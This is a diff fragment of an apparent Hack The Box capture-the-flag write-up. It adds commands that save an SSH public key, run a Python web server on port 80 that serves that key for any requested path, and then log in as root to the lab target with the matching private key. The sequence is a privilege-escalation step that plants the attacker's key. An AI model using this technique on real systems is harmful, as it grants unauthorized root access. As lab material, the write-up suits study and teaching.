@@ -628,6 +628,31 @@ LEZHuAdEqG5tKij80ZtqAAAAD3N0ZXZlQHZhcmlhdHlwZQECAwQFBg==
 ```
 
 ```
+# Save the public key
+echo "ssh-ed25519 AAAAC3N...your_key... steve@variatype" > ~/HTB/root_key.pub
+
+# Create server that ignores URL path and always serves root_key.pub
+cat > ~/HTB/server.py << 'EOF'
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        with open("root_key.pub", "rb") as f:
+            data = f.read()
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+    def log_message(self, format, *args):
+        pass
+HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
+EOF
+
+cd ~/HTB
+sudo python3 server.py
+```
+
+```
 ajdev@rootbox:~/HTB$ nano root_key
 ajdev@rootbox:~/HTB$ chmod 600 ~/HTB/root_key
 ajdev@rootbox:~/HTB$ ssh -i ~/HTB/root_key root@10.129.8.177
